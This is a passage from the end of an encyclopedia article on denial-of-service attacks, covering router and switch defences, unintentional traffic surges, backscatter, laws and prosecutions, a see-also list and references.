]




Routers
[
edit
]


Similar to switches, routers have some 
rate-limiting
 and 
ACL
 capabilities. They, too, are manually set. Most routers can be easily overwhelmed under a DoS attack. Nokia SR-OS using FP4 or FP5 processors offers DDoS protection.
[
122
]
 Nokia SR-OS also uses big data analytics-based Nokia Deepfield Defender for DDoS protection.
[
123
]
 
Cisco IOS
 has optional features that can reduce the impact of flooding.
[
124
]




Switches
[
edit
]


Most switches have some rate-limiting and 
ACL
 capability. Some switches provide automatic or system-wide 
rate limiting
, 
traffic shaping
, 
delayed binding
 (
TCP splicing
), 
deep packet inspection
 and 
bogon filtering
 (bogus IP filtering) to detect and remediate DoS attacks through automatic rate filtering and WAN Link failover and balancing. These schemes will work as long as the DoS attacks can be prevented by using them. For example, SYN flood can be prevented using delayed binding or TCP splicing. Similarly, content-based DoS may be prevented using deep packet inspection. Attacks using 
Martian packets
 can be prevented using bogon filtering. Automatic rate filtering can work as long as set rate thresholds have been set correctly. WAN-link failover will work as long as both links have a DoS prevention mechanism.
[
42
]




Blocking vulnerable ports
[
edit
]


Threats may be associated with specific TCP or UDP port numbers. Blocking these ports at the firewall can mitigated the attack. For example, in an SSDP reflection attack; the key mitigation is to block incoming UDP traffic on port 1900.
[
125
]




Unintentional denial-of-service
[
edit
]


An unintentional denial-of-service can occur when a system ends up denied, not due to a deliberate attack by a single individual or group of individuals, but simply due to a sudden enormous spike in popularity. This can happen when an extremely popular website posts a prominent link to a second, less well-prepared site, for example, as part of a news story. The result is that a significant proportion of the primary site's regular users – potentially hundreds of thousands of people – click that link in the space of a few hours, having the same effect on the target website as a DDoS attack. A VIPDoS is the same, but specifically when the link was posted by a celebrity. When 
Michael Jackson died
 in 2009, websites such as Google and Twitter slowed down or even crashed.
[
126
]
 Many sites' servers thought the requests were from a virus or spyware trying to cause a denial-of-service attack, warning users that their queries looked like "automated requests from a 
computer virus
 or spyware application".
[
127
]


News sites and link sites – sites whose primary function is to provide links to interesting content elsewhere on the Internet – are most likely to cause this phenomenon. The canonical example is the 
Slashdot effect
 when receiving traffic from 
Slashdot
. It is also known as "the 
Reddit
 hug of death" and "the 
Digg
 effect". Routers have also been known to create unintentional DoS attacks, as both 
D-Link
 and 
Netgear
 routers have overloaded NTP servers by flooding them without respecting the restrictions of client types or geographical limitations. Similar unintentional denial-of-service can also occur via other media, e.g. when a URL is mentioned on television. If a server is being indexed by 
Google
 or another 
search engine
 during peak periods of activity, or does not have a lot of available bandwidth while being indexed, it can also experience the effects of a DoS attack.
[
42
]
[
failed verification
]
[
citation needed
]


Legal action has been taken in at least one such case. In 2006, 
Universal Tube & Rollform Equipment Corporation
 sued 
YouTube
: massive numbers of would-be YouTube.com users accidentally typed the tube company's URL, utube.com. As a result, the tube company ended up having to spend large amounts of money on upgrading its bandwidth.
[
128
]
 The company appears to have taken advantage of the situation, with utube.com now containing ads for advertisement revenue. In March 2014, after 
Malaysia Airlines Flight 370
 went missing, 
DigitalGlobe
 launched a 
crowdsourcing
 service on which users could help search for the missing jet in satellite images. The response overwhelmed the company's servers.
[
129
]
 An unintentional denial-of-service may also result from a prescheduled event created by the website itself, as was the case of the 
Census in Australia
 in 2016.
[
130
]
 This could be caused when a server provides some service at a specific time.



Side effects of attacks
[
edit
]


Backscatter
[
edit
]


See also: 
Backscatter (email)
 and 
Internet background noise


In computer network security, backscatter is a side-effect of a spoofed denial-of-service attack. In this kind of attack, the attacker spoofs (or forges) the source address in 
IP packets
 sent to the victim. In general, the victim machine cannot distinguish between the spoofed packets and legitimate packets, so the victim responds to the spoofed packets as it normally would. These response packets are known as backscatter.
[
131
]


If the attacker is spoofing source addresses randomly, the backscatter response packets from the victim will be sent back to random destinations. This effect can be used by 
network telescopes
 as indirect evidence of such attacks. The term 
backscatter analysis
 refers to observing backscatter packets arriving at a statistically significant portion of the 
IP address
 space to determine the characteristics of DoS attacks and victims.



Legality
[
edit
]


Numerous websites offering tools to conduct a DDoS attack were seized by the FBI under the 
Computer Fraud and Abuse Act
.
[
132
]


See also: 
Cybercrime
 and 
DPP v Lennon


Many jurisdictions have laws under which denial-of-service attacks are illegal. 
UNCTAD
 highlights that 156 countries, or 80% globally, have enacted 
cybercrime
 laws to combat its widespread impact. Adoption rates vary by region, with Europe at a 91% rate, and Africa at 72%.
[
133
]




In the US, denial-of-service attacks may be considered a federal crime under the 
Computer Fraud and Abuse Act
 with penalties that include years of imprisonment.
[
134
]
 The 
Computer Crime and Intellectual Property Section
 of the US 
Department of Justice
 handles cases of DoS and DDoS. In one example, in July 2019, Austin Thompson, aka 
DerpTrolling
, was sentenced to 27 months in prison and $95,000 restitution by a federal court for conducting multiple DDoS attacks on major video gaming companies, disrupting their systems from hours to days.
[
135
]
[
136
]


In 
European
 countries, committing criminal denial-of-service attacks may, as a minimum, lead to arrest.
[
137
]
 The 
United Kingdom
 is unusual in that it specifically outlawed denial-of-service attacks and set a maximum penalty of 10 years in prison with the 
Police and Justice Act 2006
, which amended Section 3 of the 
Computer Misuse Act 1990
.
[
138
]


In January 2019, 
Europol
 announced that "actions are currently underway worldwide to track down the users" of Webstresser.org, a former DDoS marketplace that was shut down in April 2018 as part of Operation Power Off.
[
139
]
 Europol said UK police were conducting a number of "live operations" targeting over 250 users of Webstresser and other DDoS services.
[
140
]


On January 7, 2013, 
Anonymous
 
posted a petition
 on the 
whitehouse.gov
 site asking that DDoS be recognized as a legal form of protest similar to the 
Occupy protests
, the claim being that the similarity in the purpose of both is same.
[
141
]




See also
[
edit
]




BASHLITE
 – Malware for Linux systems


Billion laughs attack
 – Denial-of-service attack at XML parsers, exploiting entity expansion


Black fax
 – Prank fax transmission designed to waste the recipient's ink or paper


Botnet
 – Collection of compromised internet-connected devices controlled by a third party


Blaster (computer worm)
 – 2003 Windows computer worm


Clear channel assessment attack
 – Denial of service attack against a Wi-Fi network


Dendroid (malware)
 – Android based malware


Distributed denial-of-service attacks on root nameservers
 – Type of cyber attack


DNS Flood
 – Denial-of-service attack directed at a DNS server


Fork bomb
 – Type of denial-of-service software attack


High Orbit Ion Cannon
 – Denial-of-service attack tool (HOIC)


Hit-and-run DDoS
 – Type of denial-of-service cyber attack


Industrial espionage
 – Use of espionage for commercial purposes rather than security


Infinite loop
 – Programming idiom


Intrusion detection system
 – Network protection device or software


Killer poke
 – Software means of causing computer hardware damage


Lace card
 – Punch card with all holes punched


Low Orbit Ion Cannon
 – Open source network stress testing and denial-of-service attack application (LOIC)


Mixed threat attack


Network intrusion detection system
 – Network protection device or software
Pages displaying short descriptions of redirect targets


2016 Dyn cyberattack
 – 2016 cyberattack in Europe and North America
Pages displaying short descriptions of redirect targets


Operation PowerOFF
 – Joint operation to close DDoS websites


Paper terrorism
 – Use of bogus legal documents as a method of harassment


Project Shield
 – Anti-distributed-denial-of-service (anti-DDoS) service


ReDoS
 – Regular expression denial-of-service attack


Resource exhaustion attack


SlowDroid
 – Experimental denial of service attack


Slowloris (computer security)
 – Software for executing a denial-of-service attack


Virtual sit-in
 – Online civil disobedience technique


Web shell
 – Interface enabling remote access to a web server


Radio jamming
 – Interference with authorized wireless communications


XML denial-of-service attack


Xor DDoS
 – Linux trojan malware with rootkit capabilities


Zemra
 – Denial-of-service bot discovered in 2012


Zombie (computing)
 – Compromised computer used for malicious tasks on a network


Notes
[
edit
]






^
 
The -t flag on 
Windows
 systems is much less capable of overwhelming a target, also the -l (size) flag does not allow sent packet size greater than 65500 in Windows.




^
 
Although in September 2009, a vulnerability in 
Windows Vista
 was referred to as a 
teardrop attack
, this targeted 
SMB2
 which is a higher layer than the TCP packets that teardrop used).
[
100
]
[
101
]






References
[
edit
]






^
 
"Understanding Denial-of-Service Attacks"
. US-CERT. 6 February 2013
. Retrieved 
26 May
 2016
.




^
 
Elleithy, Khaled; Blagovic, Drazen; Cheng, Wang; Sideleau, Paul (1 January 2005). 
"Denial of Service Attack Techniques: Analysis, Implementation and Comparison"
. 
School of Computer Science & Engineering Faculty Publications
.




^
 
"What is a DDoS Attack? - DDoS Meaning"
. 
Kaspersky
. 13 January 2021
. Retrieved 
5 September
 2021
.




^
 
Prince, Matthew
 (25 April 2016). 
"Empty DDoS Threats: Meet the Armada Collective"
. 
CloudFlare
. Retrieved 
18 May
 2016
.




^
 
"Brand.com President Mike Zammuto Reveals Blackmail Attempt"
. 5 March 2014. Archived from 
the original
 on 11 March 2014.




^
 
"Brand.com's Mike Zammuto Discusses Meetup.com Extortion"
. 5 March 2014. Archived from 
the original
 on 13 May 2014.




^
 
Halpin, Harry (17 December 2010). 
"The Philosophy of Anonymous"
. Radicalphilosophy.com
. Retrieved 
10 September
 2013
.




^
 
"Distributed Denial of Service Attacks - The Internet Protocol Journal - Volume 7, Number 4"
. 
Cisco
. Archived from 
the original
 on 26 August 2019
. Retrieved 
26 August
 2019
.




^
 
Smith, Steve. 
"5 Famous Botnets that held the internet hostage"
. tqaweekly
. Retrieved 
20 November
 2014
.




^
 
Cimpanu, Catalin. 
"Google says it mitigated a 2.54 Tbps DDoS attack in 2017, largest known to date"
. 
ZDNet
. Retrieved 
16 September
 2021
.




^
 
Goodin, Dan (5 March 2018). 
"US service provider survives the biggest recorded DDoS in history"
. 
Ars Technica
. Retrieved 
6 March
 2018
.




^
 
"Amazon 'thwarts largest ever DDoS cyber-attack'
"
. 
BBC News
. 18 June 2020
. Retrieved 
11 November
 2020
.




^
 
"Cloudflare Mitigated Record-Setting 17.2 Million RPS DDoS Attack"
. 
SecurityWeek
. 23 August 2021.




^
 
"Yandex Pummeled by Potent Meris DDoS Botnet"
. 
threatpost.com
. 10 September 2021
. Retrieved 
23 December
 2021
.




^ 
a
 
b
 
Team, Azure Network Security (21 February 2023). 
"2022 in review: DDoS attack trends and insights"
. 
Microsoft Security Blog
. Retrieved 
7 April
 2024
.




^
 
"Cloudflare mitigates record-breaking 71 million request-per-second DDoS attack"
. 
The Cloudflare Blog
. 13 February 2023
. Retrieved 
13 January
 2024
.




^
 
Weatherbed, Jess (11 July 2023). 
"AO3 fanfiction site forced offline by wave of DDoS attacks"
. 
The Verge
. Retrieved 
9 April
 2024
.




^
 
"Archive of Our Own is down due to a DDoS attack"
. 
Polygon
. 10 July 2023.




^
 
"Settimo giorno di attacchi informatici all'Italia. NoName057(16) torna alle Banche e alle Telecomunicazioni"
. 6 August 2023.




^
 
swissinfo.ch, S. W. I. (17 January 2024). 
"Switzerland hit by cyberattack after Ukraine president's visit"
. 
SWI swissinfo.ch
. Retrieved 
8 April
 2024
.




^
 
"HTTP/2 Rapid Reset: deconstructing the record-breaking attack"
. 
The Cloudflare Blog
. 10 October 2023
. Retrieved 
13 January
 2024
.




^
 
"Google mitigated the largest DDoS attack to date, peaking above 398 million rps"
. 
Google Cloud Blog
. 10 October 2023
. Retrieved 
13 January
 2024
.




^
 
"Unprecedented 3.15 Billion Packet Rate DDoS Attack Mitigated by Global Secure Layer"
. 
globalsecurelayer.com
. Retrieved 
28 August
 2024
.




^ 
a
 
b
 
Taghavi Zargar, Saman (November 2013). 
"A Survey of Defense Mechanisms Against Distributed Denial of Service (DDoS) Flooding Attacks"
 
(PDF)
. IEEE Communications Surveys & Tutorials. pp. 2046–2069. 
Archived
 
(PDF)
 from the original on 7 March 2014
. Retrieved 
7 March
 2014
.




^
 
Khalifeh, Soltanian, Mohammad Reza (10 November 2015). 
Theoretical and experimental methods for defending against DDoS attacks
. Amiri, Iraj Sadegh, 1977-. Waltham, MA. 
ISBN
 
978-0128053997
. 
OCLC
 
930795667
.
{{
cite book
}}
:  CS1 maint: location missing publisher (
link
) CS1 maint: multiple names: authors list (
link
)




^
 
"Has Your Website Been Bitten By a Zombie?"
. Cloudbric. 3 August 2015
. Retrieved 
15 September
 2015
.




^ 
a
 
b
 
"Layer Seven DDoS Attacks". 
Infosec Institute
.




^
 
Raghavan, S.V. (2011). 
An Investigation into the Detection and Mitigation of Denial of Service (DoS) Attacks
. Springer. 
ISBN
 
9788132202776
.




^
 
Goodin, Dan (28 September 2016). 
"Record-breaking DDoS reportedly delivered by >145k hacked cameras"
. 
Ars Technica
. 
Archived
 from the original on 2 October 2016.




^
 
Khandelwal, Swati (26 September 2016). 
"World's largest 1 Tbps DDoS Attack launched from 152,000 hacked Smart Devices"
. The Hacker News. 
Archived
 from the original on 30 September 2016.




^
 
Kumar, Bhattacharyya, Dhruba; 
Kalita, Jugal Kumar
 (27 April 2016). 
DDoS attacks : evolution, detection, prevention, reaction, and tolerance
. Boca Raton, FL. 
ISBN
 
9781498729659
. 
OCLC
 
948286117
.
{{
cite book
}}
:  CS1 maint: location missing publisher (
link
) CS1 maint: multiple names: authors list (
link
)




^
 
"Imperva, Global DDoS Threat Landscape, 2019 Report"
 
(PDF)
. 
Imperva.com
. 
Imperva
. 
Archived
 
(PDF)
 from the original on 9 October 2022
. Retrieved 
4 May
 2020
.




^
 
Sides, Mor; 
Bremler-Barr, Anat
; Rosensweig, Elisha (17 August 2015). 
"Yo-Yo Attack: Vulnerability In Auto-scaling Mechanism"
. 
ACM SIGCOMM Computer Communication Review
. 
45
 (4): 103–104. 
doi
:
10.1145/2829988.2790017
.




^
 
Barr, Anat; Ben David, Ronen (2021). "Kubernetes Autoscaling: Yo 
Yo
 Attack Vulnerability and Mitigation". 
Proceedings of the 11th International Conference on Cloud Computing and Services Science
. pp. 34–44. 
arXiv
:
2105.00542
. 
doi
:
10.5220/0010397900340044
. 
ISBN
 
978-989-758-510-4
. 
S2CID
 
233482002
.




^
 
Xu, Xiaoqiong; Li, Jin; Yu, Hongfang; Luo, Long; Wei, Xuetao; Sun, Gang (2020). 
"Towards Yo-Yo attack mitigation in cloud auto-scaling mechanism"
. 
Digital Communications and Networks
. 
6
 (3): 369–376. 
doi
:
10.1016/j.dcan.2019.07.002
. 
S2CID
 
208093679
.




^
 
Lee, Newton (2013). 
Counterterrorism and Cybersecurity: Total Information Awareness
. Springer. 
ISBN
 
9781461472056
.




^
 
"Gartner Says 25 Percent of Distributed Denial of Services Attacks in 2013 Will Be Application - Based"
. 
Gartner
. 21 February 2013. Archived from 
the original
 on 25 February 2013
. Retrieved 
28 January
 2014
.




^ 
a
 
b
 
Ginovsky, John (27 January 2014). 
"What you should know about worsening DDoS attacks"
. 
ABA Banking Journal
. Archived from 
the original
 on 9 February 2014.




^
 
"Q4 2014 State of the Internet - Security Report: Numbers - The Akamai Blog"
. 
blogs.akamai.com
.




^
 
Ali, Junade (23 November 2017). 
"The New DDoS Landscape"
. 
Cloudflare Blog
.




^
 
Higgins, Kelly Jackson (17 October 2013). 
"DDoS Attack Used 'Headless' Browser In 150-Hour Siege"
. 
Dark Reading
. InformationWeek. Archived from 
the original
 on 22 January 2014
. Retrieved 
28 January
 2014
.




^ 
a
 
b
 
c
 
d
 
e
 
Kiyuna and Conyers (2015). 
Cyberwarfare Sourcebook
. Lulu.com. 
ISBN
 
978-1329063945
.




^
 
Ilascu, Ionut (21 August 2014). 
"38-Day Long DDoS Siege Amounts to Over 50 Petabits in Bad Traffic"
. Softpedia News
. Retrieved 
29 July
 2018
.




^
 
Gold, Steve (21 August 2014). 
"Video games company hit by 38-day DDoS attack"
. 
SC Magazine UK
. Archived from 
the original
 on 1 February 2017
. Retrieved 
4 February
 2016
.




^
 
Krebs, Brian (15 August 2015). 
"Stress-Testing the Booter Services, Financially"
. 
Krebs on Security
. Retrieved 
9 September
 2016
.




^
 
Mubarakali, Azath; Srinivasan, Karthik; Mukhalid, Reham; Jaganathan, Subash C. B.; Marina, Ninoslav (26 January 2020). 
"Security challenges in internet of things: Distributed denial of service attack detection using support vector machine-based expert systems"
. 
Computational Intelligence
. 
36
 (4): 1580–1592. 
doi
:
10.1111/coin.12293
. 
ISSN
 
0824-7935
. 
S2CID
 
214114645
.




^
 
Befekadu, Getachew K.; Gupta, Vijay; Antsaklis, Panos J. (2015). 
"Risk-Sensitive Control Under Markov Modulated Denial-of-Service (DoS) Attack Strategies"
. 
IEEE Transactions on Automatic Control
. 
60
 (12): 3299–3304. 
doi
:
10.1109/TAC.2015.2416926
. 
S2CID
 
9510043
. Retrieved 
19 October
 2023
.




^
 
McDowell, Mindi (4 November 2009). 
"Cyber Security Tip ST04-015 - Understanding Denial-of-Service Attacks"
. 
United States Computer Emergency Readiness Team
. 
Archived
 from the original on 4 November 2013
. Retrieved 
11 December
 2013
.




^ 
a
 
b
 
Dittrich, David (31 December 1999). 
"The "stacheldraht" distributed denial of service attack tool"
. University of Washington. Archived from 
the original
 on 16 August 2000
. Retrieved 
11 December
 2013
.




^
 
Cambiaso, Enrico; Papaleo, Gianluca; Chiola, Giovanni; Aiello, Maurizio (2015). "Designing and modeling the slow next DoS attack". 
Computational Intelligence in Security for Information Systems Conference (CISIS 2015)
. 249-259. Springer.




^
 
"Amazon CloudWatch"
. 
Amazon Web Services, Inc
.




^
 
Encyclopaedia Of Information Technology
. Atlantic Publishers & Distributors. 2007. p. 397. 
ISBN
 
978-81-269-0752-6
.




^
 
Schwabach, Aaron (2006). 
Internet and the Law
. ABC-CLIO. p. 325. 
ISBN
 
978-1-85109-731-9
.




^
 
Lu, Xicheng; Wei Zhao (2005). 
Networking and Mobile Computing
. Birkhäuser. p. 424. 
ISBN
 
978-3-540-28102-3
.




^
 
Boyle, Phillip (2000). 
"SANS Institute – Intrusion Detection FAQ: Distributed Denial of Service Attack Tools: n/a"
. SANS Institute. Archived from 
the original
 on 15 May 2008
. Retrieved 
2 May
 2008
.




^
 
Leyden, John (23 September 2004). 
"US credit card firm fights DDoS attack"
. 
The Register
. Retrieved 
2 December
 2011
.




^
 
Swati Khandelwal (23 October 2015). 
"Hacking CCTV Cameras to Launch DDoS Attacks"
. 
The Hacker News
.




^
 
Zeifman, Igal; Gayer, Ofer; Wilder, Or (21 October 2015). 
"CCTV DDoS Botnet In Our Own Back Yard"
. 
incapsula.com
.




^
 
Glenn Greenwald (15 July 2014). 
"HACKING ONLINE POLLS AND OTHER WAYS BRITISH SPIES SEEK TO CONTROL THE INTERNET"
. 
The Intercept_
. Retrieved 
25 December
 2015
.




^
 
"Who's Behind DDoS Attacks and How Can You Protect Your Website?"
. Cloudbric. 10 September 2015
. Retrieved 
15 September
 2015
.




^
 
Solon, Olivia (9 September 2015). 
"Cyber-Extortionists Targeting the Financial Sector Are Demanding Bitcoin Ransoms"
. Bloomberg
. Retrieved 
15 September
 2015
.




^
 
Greenberg, Adam (14 September 2015). 
"Akamai warns of increased activity from DDoS extortion group"
. SC Magazine
. Retrieved 
15 September
 2015
.




^
 
"OWASP Plan - Strawman - Layer_7_DDOS.pdf"
 
(PDF)
. 
Open Web Application Security Project
. 18 March 2014. 
Archived
 
(PDF)
 from the original on 9 October 2022
. Retrieved 
18 March
 2014
.




^
 
"OWASP HTTP Post Tool"
. Archived from 
the original
 on 21 December 2010.




^
 
"What Is a CC Attack?"
. 
HUAWEI CLOUD-Grow With Intelligence
. 
Archived
 from the original on 5 March 2019
. Retrieved 
5 March
 2019
.




^
 
刘鹏; 郭洋. 
"CC (challenge collapsar) attack defending method, device and system"
. 
Google Patents
. 
Archived
 from the original on 5 March 2019
. Retrieved 
5 March
 2018
.




^
 
曾宪力; 史伟; 关志来; 彭国柱. 
"CC (Challenge Collapsar) attack protection method and device"
. 
Google Patents
. 
Archived
 from the original on 5 March 2019
. Retrieved 
5 March
 2018
.




^
 
"史上最臭名昭著的黑客工具 CC的前世今生"
. 
NetEase
 (in Simplified Chinese). 驱动中国网(北京). 24 July 2014. Archived from 
the original
 on 5 March 2019
. Retrieved 
5 March
 2019
.




^
 
Sun, Fei Xian (2011). 
"Danger Theory Based Risk Evaluation Model for Smurf Attacks"
. 
Key Engineering Materials
. 467–469: 515–521. 
doi
:
10.4028/www.scientific.net/KEM.467-469.515
. 
ISSN
 
1662-9795
. 
S2CID
 
110045205
.




^
 
"Types of DDoS Attacks"
. 
Distributed Denial of Service Attacks(DDoS) Resources, Pervasive Technology Labs at Indiana University
. Advanced Networking Management Lab (ANML). 3 December 2009. Archived from 
the original
 on 14 September 2010
. Retrieved 
11 December
 2013
.




^ 
a
 
b
 
"What Is a Nuke? | Radware — DDoSPedia"
. 
security.radware.com
. Retrieved 
16 September
 2019
.




^
 
Paul Sop (May 2007). 
"Prolexic Distributed Denial of Service Attack Alert"
. 
Prolexic Technologies Inc
. Archived from 
the original
 on 3 August 2007
. Retrieved 
22 August
 2007
.




^
 
Robert Lemos (May 2007). 
"Peer-to-peer networks co-opted for DOS attacks"
. SecurityFocus. Archived from 
the original
 on 24 September 2015
. Retrieved 
22 August
 2007
.




^
 
Fredrik Ullner (May 2007). 
"Denying distributed attacks"
. DC++: Just These Guys, Ya Know?
. Retrieved 
22 August
 2007
.




^
 
Leyden, John (21 May 2008). 
"Phlashing attack thrashes embedded systems"
. 
The Register
. Retrieved 
7 March
 2009
.




^
 
Jackson Higgins, Kelly (19 May 2008). 
"Permanent Denial-of-Service Attack Sabotages Hardware"
. Dark Reading. Archived from 
the original
 on 8 December 2008.




^
 
"
"BrickerBot" Results In PDoS Attack"
. 
Radware
. 4 May 2017
. Retrieved 
22 January
 2019
.




^
 
"EUSecWest Applied Security Conference: London, U.K."
 EUSecWest. 2008. Archived from 
the original
 on 1 February 2009.




^
 
Rossow, Christian (February 2014). 
"Amplification Hell: Revisiting Network Protocols for DDoS Abuse"
 
(PDF)
. Internet Society. Archived from 
the original
 
(PDF)
 on 4 March 2016
. Retrieved 
4 February
 2016
.




^
 
Paxson, Vern (2001). 
"An Analysis of Using Reflectors for Distributed Denial-of-Service Attacks"
. ICIR.org.




^
 
"Alert (TA14-017A) UDP-based Amplification Attacks"
. US-CERT. 8 July 2014
. Retrieved 
8 July
 2014
.




^
 
"CVE-2022-26143: A Zero-Day vulnerability for launching UDP amplification DDoS attacks"
. 
Cloudflare
 Blog
. 8 March 2022
. Retrieved 
16 March
 2022
.




^
 
"Memcached 1.5.6 Release Notes"
. 
GitHub
. 27 February 2018
. Retrieved 
3 March
 2018
.




^
 
"DRDoS / Amplification Attack using ntpdc monlist command"
. support.ntp.org. 24 April 2010
. Retrieved 
13 April
 2014
.




^
 
van Rijswijk-Deij, Roland (2014). "DNSSEC and its potential for DDoS attacks: A comprehensive measurement study". 
Proceedings of the 2014 Conference on Internet Measurement Conference
. ACM Press. pp. 449–460. 
doi
:
10.1145/2663716.2663731
. 
ISBN
 
9781450332132
. 
S2CID
 
2094604
.




^
 
Adamsky, Florian (2015). 
"P2P File-Sharing in Hell: Exploiting BitTorrent Vulnerabilities to Launch Distributed Reflective DoS Attacks"
.




^
 
Vaughn, Randal; Evron, Gadi (2006). 
"DNS Amplification Attacks"
 
(PDF)
. ISOTF. Archived from 
the original
 
(PDF)
 on 14 December 2010.




^
 
"Alert (TA13-088A) DNS Amplification Attacks"
. US-CERT. 8 July 2013
. Retrieved 
17 July
 2013
.




^ 
a
 
b
 
Kolias, Constantinos; Kambourakis, Georgios; Stavrou, Angelos; Voas, Jeffrey (2017). "DDoS in the IoT: Mirai and Other Botnets". 
Computer
. 
50
 (7): 80–84. 
doi
:
10.1109/MC.2017.201
. 
S2CID
 
35958086
.




^
 
Kuzmanovic, Aleksandar; Knightly, Edward W. (25 August 2003). "Low-rate TCP-targeted denial of service attacks: The shrew vs. The mice and elephants". 
Proceedings of the 2003 conference on Applications, technologies, architectures, and protocols for computer communications
. ACM. pp. 75–86. 
CiteSeerX
 
10.1.1.307.4107
. 
doi
:
10.1145/863955.863966
. 
ISBN
 
978-1581137354
. 
S2CID
 
173992197
.




^
 
"R-u-dead-yet"
. 8 September 2016.
[
non-primary source needed
]




^
 
"SACK Panic and Other TCP Denial of Service Issues"
. 
Ubuntu
 Wiki
. 17 June 2019. Archived from 
the original
 on 19 June 2019
. Retrieved 
21 June
 2019
.




^
 
"CVE-2019-11479"
. 
CVE
. Archived from 
the original
 on 21 June 2019
. Retrieved 
21 June
 2019
.




^
 
Yu Chen; Kai Hwang; Yu-Kwong Kwok (2005). "Filtering of shrew DDoS attacks in frequency domain". 
The IEEE Conference on Local Computer Networks 30th Anniversary (LCN'05)l
. pp. 8 pp. 
doi
:
10.1109/LCN.2005.70
. 
hdl
:
10722/45910
. 
ISBN
 
978-0-7695-2421-4
. 
S2CID
 
406686
.




^
 
"What is a Slow Read DDoS Attack?"
. 
NetScout Systems
.




^ 
a
 
b
 
Ben-Porat, U.; Bremler-Barr, A.; Levy, H. (1 May 2013). "Vulnerability of Network Mechanisms to Sophisticated DDoS Attacks". 
IEEE Transactions on Computers
. 
62
 (5): 1031–1043. 
doi
:
10.1109/TC.2012.49
. 
ISSN
 
0018-9340
. 
S2CID
 
26395831
.




^
 
orbitalsatelite (8 September 2016). 
"Slow HTTP Test"
. 
SourceForge
.




^
 
Eddy, Wesley (August 2007). 
"TCP SYN Flooding Attacks and Common Mitigations"
. 
Tools.ietf.org
. 
doi
:
10.17487/RFC4987
. 
RFC
 
4987
. Retrieved 
2 December
 2011
.




^
 
"CERT Advisory CA-1997-28 IP Denial-of-Service Attacks"
. CERT. 1998
. Retrieved 
18 July
 2014
.




^
 
"Windows 7, Vista exposed to 'teardrop attack'
"
. 
ZDNet
. 8 September 2009. Archived from 
the original
 on 6 November 2010
. Retrieved 
11 December
 2013
.




^
 
"Microsoft Security Advisory (975497): Vulnerabilities in SMB Could Allow Remote Code Execution"
. Microsoft.com. 8 September 2009
. Retrieved 
2 December
 2011
.




^
 
Bhardwaj, Akashdeep (12 June 2023), 
"Solutions for DDoS Attacks on Cloud Environment"
, 
New Age Cyber Threat Mitigation for Cloud Computing Networks
, BENTHAM SCIENCE PUBLISHERS, pp. 42–55, 
doi
:
10.2174/9789815136111123010006
, 
ISBN
 
978-981-5136-11-1
, retrieved 
9 February
 2024




^
 
"FBI — Phony Phone Calls Distract Consumers from Genuine Theft"
. FBI.gov. 11 May 2010
. Retrieved 
10 September
 2013
.




^
 
"Internet Crime Complaint Center's (IC3) Scam Alerts January 7, 2013"
. 
IC3.gov
. 7 January 2013
. Retrieved 
10 September
 2013
.




^
 
"TTL Expiry Attack Identification and Mitigation"
. 
Cisco Systems
. Retrieved 
24 May
 2019
.




^
 
"New DDoS Attack Method Leverages UPnP"
. 
Dark Reading
. Retrieved 
29 May
 2018
.




^
 
"New DDoS Attack Method Demands a Fresh Approach to Amplification Assault Mitigation – Blog | Imperva"
. 
Blog | Imperva
. 14 May 2018
. Retrieved 
29 May
 2018
.




^
 
"Multi-State Information Sharing and Analysis Center"
. 
CIS
.




^
 
"UDP-Based Amplification Attacks"
. 18 December 2019.




^
 
"Stupidly Simple DDoS Protocol (SSDP) generates 100 Gbps DDoS"
. 
The Cloudflare Blog
. 28 June 2017.




^
 
"Stupidly Simple DDoS Protocol (SSDP) generates 100 Gbps DDoS"
. 
The Cloudflare Blog
. 28 June 2017
. Retrieved 
13 October
 2019
.




^
 
Loukas, G.; Oke, G. (September 2010). 
"Protection Against Denial of Service Attacks: A Survey"
 
(PDF)
. 
Comput. J.
 
53
 (7): 1020–1037. 
doi
:
10.1093/comjnl/bxp078
. Archived from 
the original
 
(PDF)
 on 24 March 2012
. Retrieved 
2 December
 2015
.




^
 
"MPLS-Based Synchronous Traffic Shunt (NANOG28)"
. 
Riverhead Networks, Cisco, Colt Telecom
. NANOG28. 3 January 2003. Archived from the original on 15 May 2021
. Retrieved 
10 January
 2003
.
{{
cite web
}}
:  CS1 maint: bot: original URL status unknown (
link
)




^
 
"Diversion and Sieving Techniques to Defeat DDoS attacks"
. 
Cisco, Riverhead Networks
. NANOG23. 23 October 2001. Archived from the original on 15 May 2021
. Retrieved 
30 October
 2001
.
{{
cite web
}}
:  CS1 maint: bot: original URL status unknown (
link
)




^
 
"DDoS Mitigation via Regional Cleaning Centers (Jan 2004)"
 
(PDF)
. 
SprintLabs.com
. Sprint ATL Research. Archived from 
the original
 
(PDF)
 on 21 September 2008
. Retrieved 
2 December
 2011
.




^
 
Alqahtani, S.; Gamble, R. F. (1 January 2015). "DDoS Attacks in Service Clouds". 
2015 48th Hawaii International Conference on System Sciences
. pp. 5331–5340. 
doi
:
10.1109/HICSS.2015.627
. 
ISBN
 
978-1-4799-7367-5
. 
S2CID
 
32238160
.




^
 
Kousiouris, George (2014). "KEY COMPLETION INDICATORS:minimizing the effect of DoS attacks on elastic Cloud-based applications based on application-level markov chain checkpoints". 
CLOSER Conference
. pp. 622–628. 
doi
:
10.5220/0004963006220628
. 
ISBN
 
978-989-758-019-2
.




^
 
Patrikakis, C.; Masikos, M.; Zouraraki, O. (December 2004). 
"Distributed Denial of Service Attacks"
. 
The Internet Protocol Journal
. 
7
 (4): 13–35. Archived from 
the original
 on 27 December 2015
. Retrieved 
13 January
 2010
.




^
 
Popeskic, Valter (16 October 2012). 
"How to prevent or stop DoS attacks?"
.




^
 
Froutan, Paul (24 June 2004). 
"How to defend against DDoS attacks"
. 
Computerworld
. Archived from 
the original
 on 2 July 2014
. Retrieved 
15 May
 2010
.




^
 
"Cyber security vulnerability concerns skyrocket"
. 
ComputerWeekly.com
. Retrieved 
13 August
 2018
.




^
 
"FP Network Processor Technology"
. Retrieved 
15 June
 2024
.




^
 
Nokia Deepfield Defender




^
 
Suzen, Mehmet. 
"Some IoS tips for Internet Service (Providers)"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on 10 September 2008.




^
 
"SSDP DDoS attack | Cloudflare"
.




^
 
Shiels, Maggie (26 June 2009). 
"Web slows after Jackson's death"
. 
BBC News
.




^
 
"We're Sorry. Automated Query error"
. 
Google Product Forums › Google Search Forum
. 20 October 2009
. Retrieved 
11 February
 2012
.




^
 
"YouTube sued by sound-alike site"
. 
BBC News
. 2 November 2006.




^
 
Bill Chappell (12 March 2014). 
"People Overload Website, Hoping To Help Search For Missing Jet"
. NPR
